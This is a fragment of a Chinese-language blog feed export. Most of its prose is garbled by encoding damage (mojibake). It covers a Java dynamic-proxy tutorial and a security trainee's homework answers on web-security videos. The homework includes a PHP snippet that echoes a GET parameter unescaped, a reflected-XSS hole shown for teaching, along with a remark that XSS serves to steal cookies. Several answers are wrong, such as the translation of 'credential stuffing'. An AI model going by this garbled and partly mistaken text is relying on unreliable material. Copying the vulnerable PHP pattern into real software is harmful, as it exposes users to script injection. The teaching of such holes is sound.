&#125;<br>                &#125;);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternalError</span>(e.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å…³é”®å‡½æ•°:<code>Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</code>ä¸»è¦å°±æ˜¯ç”Ÿæˆä»£ç†ç±»ã€‚</p><p>JDKä¼šç”Ÿæˆä¸€ä¸ªå«$Proxy0çš„ä»£ç†ç±»ï¼Œè¿™ä¸ªç±»æ–‡ä»¶æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œåœ¨åˆ›å»ºä»£ç†ç±»å¯¹è±¡æ—¶ï¼Œé€šè¿‡åå°„æœºåˆ¶è·å¾—è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œç„¶ååˆ›å»ºä»£ç†ç±»å®ä¾‹ã€‚</p><h3 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><h4 id="ä»£ç†ç±»-1"><a href="#ä»£ç†ç±»-1" class="headerlink" title="ä»£ç†ç±»"></a>ä»£ç†ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object factory;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(Object factory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        before();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>        after();<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;å¼€å§‹&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ç»“æŸ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="hljs-built_in">this</span>);<br>&#125; #è¿™ä¸€æ®µä»£ç å…¶å®å°±æ˜¯ä¸ºäº†åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œå¹¶ä¸”ä¼šæ‰§è¡Œhanderä¸­çš„invokeæ–¹æ³•<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> method.invoke(factory,args);<br>#è¿™ä¸ªå…¶å®å°±æ˜¯ä¸ºäº†å®ç°ä¿®æ”¹çš„éƒ¨åˆ†ï¼Œå…¶ <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;...&#125;ä¼šè¢«<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span>&#123;...&#125;è§¦å‘<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºæ¥å£"><a href="#åˆ›å»ºæ¥å£" class="headerlink" title="åˆ›å»ºæ¥å£"></a>åˆ›å»ºæ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppleShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å®ç°æ¥å£"><a href="#å®ç°æ¥å£" class="headerlink" title="å®ç°æ¥å£"></a>å®ç°æ¥å£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AppleShop</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒè‹¹æœå•¦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BannerShopReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BananerShop</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¦™è•‰å•¦&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å®ç°ç±»-2"><a href="#å®ç°ç±»-2" class="headerlink" title="å®ç°ç±»"></a>å®ç°ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AppleShopReal</span> <span class="hljs-variable">appleShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleShopReal</span>();<br>        <span class="hljs-type">Company</span> <span class="hljs-variable">company</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Company</span>();<br>        company.setFactory(appleShopReal);<br>        <span class="hljs-type">AppleShop</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (AppleShop) company.getProxyInstance();<br>        proxyInstance.Apple();<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);<br><br>        <span class="hljs-type">BannerShopReal</span> <span class="hljs-variable">bannerShopReal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BannerShopReal</span>();<br>        company.setFactory(bannerShopReal);<br>        <span class="hljs-type">BananerShop</span> <span class="hljs-variable">proxyInstance1</span> <span class="hljs-operator">=</span> (BananerShop) company.getProxyInstance();<br>        proxyInstance1.Bananer();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åœ¨æˆ‘ç¿»é˜…å¤§ä½¬åšå®¢çš„æ—¶å€™æœ‰å‡ ç‚¹å€¼å¾—æ³¨æ„çš„åœ°æ–¹ã€‚<br> <code>AppleShop proxyInstance = (AppleShop) company.getProxyInstance();</code>å’Œ<code>BananerShop proxyInstance1 = (BananerShop) company.getProxyInstance();</code></p><p><strong>ä¸èƒ½å¼ºè½¬å®ç°ç±»ã€‚</strong>åŸå› ï¼šä¸èƒ½ç”¨æ¥å£çš„å®ç°ç±»æ¥è½¬æ¢Proxyçš„å®ç°ç±»ï¼Œå› ä¸ºä»–ä»¬æ˜¯åŒçº§çš„ï¼ˆä»£ç†ç±»æœ¬èº«ç»§æ‰¿äº†Proxyï¼‰ï¼Œåº”è¯¥ç”¨å…±åŒçš„æ¥å£æ¥è½¬æ¢ã€‚<br>æˆåŠŸã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045630.png" alt="QQæˆªå›¾20220225204149"></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepnepè§ä¹ é˜Ÿå‘˜ä»»åŠ¡ï¼ˆä¸å®Œæ•´ï¼‰</title>
    <link href="/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"/>
    <url>/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepnepè§ä¹ é˜Ÿå‘˜"><a href="#Nepnepè§ä¹ é˜Ÿå‘˜" class="headerlink" title="Nepnepè§ä¹ é˜Ÿå‘˜"></a>Nepnepè§ä¹ é˜Ÿå‘˜</h1><h2 id="åˆå­¦-è§†é¢‘1"><a href="#åˆå­¦-è§†é¢‘1" class="headerlink" title="åˆå­¦-è§†é¢‘1"></a>åˆå­¦-è§†é¢‘1</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222652.png" alt="QQæˆªå›¾20220217222652"></p><p>å»youtubeä¸Šæ‰¾äº†ç¿»è¯‘å˜¿å˜¿ã€‚<a href="https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj">https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj</a> ï¼ˆå­—å¹•è‡ªå¸¦ç¿»è¯‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222851.png" alt="QQæˆªå›¾20220217222851"></p><p>è¿™é‡Œå°±å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.æœ¬è§†é¢‘ä¸€å¼€å§‹ä»‹ç»äº†å“ªä¸¤ä¸ªå·¥å…·ï¼Œä»–ä»¬çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä½œè€…ä¼šæ¨èfirefoxï¼Œå®ƒçš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ<span class="hljs-number">5</span>åˆ†ï¼‰<br><br><span class="hljs-attribute">bp</span>ï¼ˆæŠ“åŒ…ï¼‰ å’Œ firefoxï¼ˆè®¾ç½®ä»£ç†æ–¹ä¾¿ï¼‰<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.æœ¬è§†é¢‘ä¸­ä½“ç°äº†å“ªäº›æ”»é˜²ä¸Šçš„å“²å­¦è§‚ç‚¹ï¼Ÿä½œè€…å¸Œæœ›ä½ å…»æˆä»€ä¹ˆæ ·çš„æ€ç»´ï¼Ÿè¿™äº›æ€ç»´åœ¨å¸®åŠ©ä½ æŒ–æ˜æ¼æ´çš„æ—¶å€™æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿç»“åˆä½ çš„ç»å†ä¸è§†é¢‘å†…å®¹è°ˆè°ˆä½ çš„çœ‹æ³•ã€‚ï¼ˆ10åˆ†ï¼‰<br><br>ä½“ä¼šå¤ªå¤šå•¦~~<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if(isset($_GET[ &#x27; name &#x27; ]))&#123;<br>echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#x27;name&#x27;]&#125; !&lt;/h1&gt;&quot;;<br>&#125;<br>?&gt;<br>å¦‚æœgetæ–¹æ³•å­˜åœ¨nameå˜é‡å£°æ˜ï¼Œåˆ™è¾“å‡ºnameçš„å€¼ã€‚<br>&lt;form method=&quot;GET&quot;&gt;<br>Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;<br>&lt;input type=&quot; submit&quot;&gt;<br>é‚£ä¹ˆï¼Œä»¥ä¸Šä»£ç ä¸­ï¼Œå“ªäº›éƒ¨åˆ†å±äºå®¢æˆ·ç«¯çš„å†…å®¹ï¼Œå“ªäº›å±äºæœåŠ¡ç«¯çš„å†…å®¹ï¼Ÿï¼ˆ1åˆ†ï¼‰<br>æœåŠ¡ç«¯ï¼šå‰é¢éƒ¨åˆ† å®¢æˆ·ç«¯ï¼šåé¢éƒ¨åˆ†<br>    <br>å®¢æˆ·ç«¯æ˜¯é€šè¿‡ä¼ é€’ä»€ä¹ˆå‚æ•°æ¥æ§åˆ¶æœåŠ¡ç«¯ä»£ç çš„ï¼Ÿï¼ˆ1åˆ†ï¼‰<br>get<br><br>å®¢æˆ·ç«¯é€šè¿‡æ§åˆ¶è¯¥å‚æ•°ä¼šå¯¹æœåŠ¡ç«¯é€ æˆä»€ä¹ˆå½±å“ï¼Œç»§è€Œä½¿å¾—å®¢æˆ·ç«¯æœ¬èº«æ”¶åˆ°å½±å“ï¼Œä»è€Œé€ æˆäº†ä»€ä¹ˆæ¼æ´ï¼Ÿå¦‚æœæ˜¯xssæ¼æ´ï¼Œå…·ä½“åˆæ˜¯ä»€ä¹ˆç±»å‹çš„xssæ¼æ´ï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼ˆ3åˆ†ï¼‰<br>xssï¼Œåå°„ã€‚åå°„ç›´æ¥åœ¨ç½‘é¡µä¸­å›æ˜¾ã€‚<br>    <br>æ€è€ƒï¼šç°å®ä¸­å¦‚ä½•åˆ©ç”¨xssæ¼æ´å®æ–½æ”»å‡»ï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•é¢„é˜²ï¼Ÿï¼ˆ1åˆ†ï¼‰<br>ç›—å–cookieã€‚<br>é¢„é˜²ï¼š1ã€è¿‡æ»¤å‚æ•°ï¼ˆä½†æ˜¯æ— æ³•å®Œå…¨å®ç°ï¼‰ï¼Œæ¯”å¦‚URLå’Œå‚æ•°è¿›è¡Œå„ç§çš„ç¼–ç ï¼Œæ¯”å¦‚escape, encodeURI, encodeURIComponent, 16è¿›åˆ¶ï¼Œ10è¿›åˆ¶ï¼Œ8è¿›åˆ¶ï¼Œæ¥ç»•è¿‡XSSè¿‡æ»¤ã€‚<br>    2ã€é»‘ç™½åå•ç»“åˆ<br></code></pre></td></tr></table></figure><h2 id="åˆå­¦-è§†é¢‘2"><a href="#åˆå­¦-è§†é¢‘2" class="headerlink" title="åˆå­¦-è§†é¢‘2"></a>åˆå­¦-è§†é¢‘2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.ç›®å‰owaspçš„åå¤§webå®‰å…¨æ¼æ´æ˜¯å“ªäº›ï¼Ÿè¿™äº›æ¼æ´æ’åæ˜¯æŒ‰ç…§æ¼æ´çš„ä¸¥é‡ç¨‹åº¦æ’åºçš„è¿˜æ˜¯æŒ‰ç…§æ¼æ´çš„å¸¸è§ç¨‹åº¦æ’åºçš„ï¼Ÿï¼ˆ2åˆ†ï¼‰<br>æ³¨å…¥ã€å¤±æ•ˆèº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†ã€è·¨ç«™è„šæœ¬XSSã€å¤±æ•ˆçš„è®¿é—®æ§åˆ¶ã€å®‰å…¨é…ç½®é”™è¯¯ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€è·¨ç«™è¯·æ±‚ä¼ªé€ CSRFã€ä½¿ç”¨å«æœ‰æ¼æ´çš„æ§ä»¶ã€æ”»å‡»æ£€æµ‹å’Œé˜²èŒƒä¸è¶³ã€æœªå—ä¿æŠ¤çš„ APIsã€ä¸å®‰å…¨çš„ååºåˆ—åŒ–ã€ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§<br><br>è‚¯å®šæ˜¯å¸¸è§ï¼Œå› ä¸ºæ¯ä¸ªæ¼æ´éƒ½å¾ˆå¸¸è§ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/owasp-top-10.jpg.imgw.850.x.jpg" alt="owasp-top-10.jpg.imgw.850.x"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.è¯·ç¿»è¯‘ä¸€ä¸‹credential stuffingï¼ˆ1åˆ†<br><br>è¯ä¹¦å¡«å……<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3.</span>ä¸ºä»€ä¹ˆè¯´ä¸å……åˆ†çš„æ—¥å¿—è®°å½•<span class="hljs-comment">(insufficient logging)</span>ä¹Ÿç®—owaspåå¤§æ¼æ´çš„ä¸€ç§ï¼Ÿä»–çš„å±å®³æ€§å¦‚ä½•ï¼ˆ<span class="hljs-number">2</span>åˆ†ï¼‰<br><br>æ”»å‡»è€…ä¾é ç›‘æ§çš„ä¸è¶³å’Œå“åº”çš„ä¸åŠæ—¶æ¥è¾¾æˆä»–ä»¬çš„ç›®æ ‡è€Œä¸è¢«çŸ¥æ™“ã€‚æ¯”å¦‚æ—¥å¿—æ²¡æœ‰è®°å½•ç™»å½•å¤±è´¥ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯èƒ½å°±å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£å¤šæ¬¡è¿›è¡Œç™»å½•å°è¯•ï¼Œä½†æ˜¯æ—¥å¿—ä¸­å´æ²¡æœ‰è®°å½•ã€‚è¿™å°±å¯èƒ½è®©æ”»å‡»è€…æˆåŠŸå…¥ä¾µç³»ç»Ÿå¹¶éšåŒ¿è‡ªå·±çš„è¡Œè¸ªã€‚è¿™ä¸ªçœ‹ä¼¼å±å®³ä¸å¤§ä½†å´æ˜¯ååˆ†ä¸¥é‡çš„å±å®³ï¼Œå› ä¸ºä¸€ä¸ªæ—¥å¿—ç³»ç»Ÿä¸å®Œå–„çš„æœåŠ¡å™¨å¾ˆå®¹æ˜“é­å—æ”»å‡»å¹¶ä¸”åœ¨é­å—æ”»å‡»åæ— æ³•åˆ¤æ–­æ”»å‡»æ¥æºï¼Œè¿™æ ·å°±æ— æ³•åšå‡ºç›¸åº”çš„é˜²å¾¡ï¼Œå¾ˆå¯èƒ½å†æ¬¡é­å—åŒæ ·çš„æ”»å‡»ã€‚<br><br>åªè¦æ˜¯æ¼æ´éƒ½ä¸¥é‡ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>.è¯·ç¿»é˜…ä¸€ä¸‹owasp testing guideï¼Œä»¥åŠowasp testing guide check-listï¼Œè§†é¢‘è¯´æ€ä¹ˆç»“åˆè¿™ä¸¤ä¸ªæ–‡æ¡£æ¥å­¦ä¹ æ¸—é€æµ‹è¯•ï¼Ÿ ç»“åˆä½ å¹³æ—¶æ¸—é€è¿‡ç¨‹ä¸­çš„ç»éªŒï¼Œè°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ<span class="hljs-number">3</span>åˆ†ï¼‰<br><br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">5.</span>you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> you notes<br>   you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> things you can refer <span class="hljs-keyword">to</span><br>ç»“åˆè¿™ä¸¤å¥è¯è°ˆè°ˆä½ çš„æ„Ÿæƒ³ã€‚ï¼ˆ<span class="hljs-number">2</span>åˆ†ï¼‰<br><br>æˆ‘æ­£åœ¨åšçš„äº‹æƒ…ã€‚<br></code></pre></td></tr></table></figure><h2 id="åˆå­¦-è§†é¢‘3"><a href="#åˆå­¦-è§†é¢‘3" class="headerlink" title="åˆå­¦-è§†é¢‘3"></a>åˆå­¦-è§†é¢‘3</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-number">1</span>.httpæŠ¥æ–‡çš„ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ<span class="hljs-number">1</span>åˆ†ï¼‰<br><br><span class="hljs-number">1</span>ã€æ–¹å¼(<span class="hljs-keyword">method</span>)ï¼šå®¢æˆ·ç«¯å¸Œæœ›æœåŠ¡å™¨å¯¹èµ„æºæ‰§è¡Œçš„åŠ¨ä½œï¼Œæ˜¯ä¸€ä¸ªå•ç‹¬çš„è¯ï¼Œæ¯”å¦‚ï¼Œ<span class="hljs-title function_">GET</span>ã€<span class="hljs-title function_">POST</span>æˆ–<span class="hljs-title function_">HEAD</span><br><br>2ã€è¯·æ±‚<span class="hljs-title function_">URL</span><span class="hljs-params">(request-URL)</span>ï¼šè¦ç›´æ¥ä¸æœåŠ¡å™¨è¿›è¡Œå¯¹è¯ï¼Œåªè¦è¯·æ±‚<span class="hljs-title function_">URL</span>æ˜¯èµ„æºçš„ç»å¯¹è·¯å¾„å°±å¯ä»¥äº†ï¼ŒæœåŠ¡å™¨å¯ä»¥å‡å®šè‡ªå·±æ˜¯<span class="hljs-title function_">URL</span>çš„ä¸»æœº/ç«¯å£<br><br>3ã€ç‰ˆæœ¬<span class="hljs-params">(version)</span>ï¼šæŠ¥æ–‡æ‰€ä½¿ç”¨çš„<span class="hljs-title function_">HTTP</span>ç‰ˆæœ¬ã€‚å…¶æ ¼å¼ï¼š<span class="hljs-title function_">HTTP</span>/&lt;ä¸»è¦ç‰ˆæœ¬å·&gt;.&lt;æ¬¡è¦ç‰ˆæœ¬å·&gt;<br><br>4ã€çŠ¶æ€ç <span class="hljs-params">(status-code)</span>ï¼šçŠ¶æ€ç æ˜¯ä¸‰ä½æ•°å­—ï¼Œæè¿°äº†è¯·æ±‚è¿‡ç¨‹ä¸­æ‰€å‘ç”Ÿçš„æƒ…å†µã€‚æ¯ä¸ªçŠ¶æ€ç çš„ç¬¬ä¸€ä½æ•°å­—éƒ½ç”¨äºæè¿°çŠ¶æ€çš„ä¸€èˆ¬ç±»åˆ«<span class="hljs-params">(æ¯”å¦‚ï¼Œâ€œæˆåŠŸâ€ã€â€œå‡ºé”™â€ç­‰ç­‰)</span><br><br>5ã€åŸå› çŸ­è¯­<span class="hljs-params">(reason-phrase)</span>ï¼šæ•°å­—çŠ¶æ€ç çš„å¯è¯»ç‰ˆæœ¬ï¼ŒåŒ…å«è¡Œç»ˆæ­¢åºåˆ—ä¹‹å‰çš„æ‰€æœ‰æ–‡æœ¬ã€‚åŸå› çŸ­è¯­åªå¯¹äººç±»æœ‰æ„ä¹‰ï¼Œå› æ­¤ï¼Œå°½ç®¡å“åº”è¡Œ<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">NOT</span> <span class="hljs-title function_">OK</span>å’Œ<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">OK</span>ä¸­åŸå› çŸ­è¯­çš„å«ä¹‰ä¸åŒï¼Œä½†åŒæ ·éƒ½ä¼šè¢«å½“ä½œæˆåŠŸæŒ‡ç¤ºå¤„ç†<br><br>6ã€å¤´éƒ¨<span 